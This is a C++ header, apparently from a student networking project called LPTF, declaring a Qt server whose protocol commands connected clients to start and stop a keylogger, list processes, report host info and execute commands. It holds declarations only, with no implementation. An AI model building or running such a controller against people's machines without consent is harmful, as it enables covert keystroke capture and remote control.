#ifndef LPTF_SERVER_HPP
#define LPTF_SERVER_HPP

#include "LPTF_Socket.h"
#include "LPTF_Packet.h"
#include <thread>
#include <string>
#include <vector>
#include <conio.h>
#include <iostream>
#include <iomanip>

#include <QObject>
#include <QString>
#include <QDebug>

enum class CommandType : uint8_t
{
    SEND_MESSAGE = 0x01,
    START_KEYLOGGER_REQUEST = 0x02,
    STOP_KEYLOGGER_REQUEST = 0x03,
    LIST_PROCESSES_REQUEST = 0x04,
    HOST_INFO_REQUEST = 0x05,
    EXECUTE_COMMAND_REQUEST = 0x06,
    HOST_INFO_RESPONSE = 0x81,
    KEY_LOG_DATA_RESPONSE = 0x82,
    LIST_PROCESSES_RESPONSE = 0x84,
    COMMAND_RESULT_RESPONSE = 0x85
};

/**
 * LPTF_Server
 * Handles the server-side operations for the LPTF protocol.
 * It manages socket communication, packet creation, and command handling.
 */
class LPTF_Server : public QObject
{
    Q_OBJECT

public:
    // Constructor: Initializes the server with IP and port and destructor
    explicit LPTF_Server(const std::string &ip, int port, QObject *parent = nullptr);
    ~LPTF_Server();

    // Handles incoming client connections and processes commands
    void run();

public slots:
    // Handles the reception of commands from clients
    void sendSystemInfoRequest();
    // Sends a request to list processes to the connected clients
    void sendProcessListRequest();
    // Sends a system info request for a specific client identified by socket ID
    void sendSystemInfoRequestFor(const QString &socketId);

signals:
    // Signals emitted for various events
    void clientCountChanged(int count);
    // Signal emitted when system information is received
    void systemInfoReceived(const QString &info, const QString &socketId);
    // Signal emitted when a process list is received
    void processListReceived(const std::vector<std::vector<std::string>> &processes);
    // Signal emitted when a client is connected
    void clientDisconnected(const QString &socketId);
    // Signal emitted when a client is connected
    void clientConnected(const QString &socketId);

private:
    LPTF_Socket serverSocket;
    SOCKET clientSocket;
    std::vector<LPTF_Socket *> clientSockets;

    // Handles incoming client connections and processes commands
    void handleClient(LPTF_Socket &clientSocket);
    // Handles the connection process, accepting new clients and managing existing ones
    void handleConnection();
    // Sends a packet to a specific client
    void sendPacketToClient(LPTF_Socket &clientSocket, const std::string &data, CommandType type);
    void handleAdminInput();
    // Handles commands received from clients
    void handleCommand(const LPTF_Packet &packet, LPTF_Socket &clientSocket);
    // Deserializes a string table from the packet payload
    std::vector<std::vector<std::string>> deserializeStringTable(const std::vector<uint8_t> &payload);
};
#endif // LPTF_SERVER_H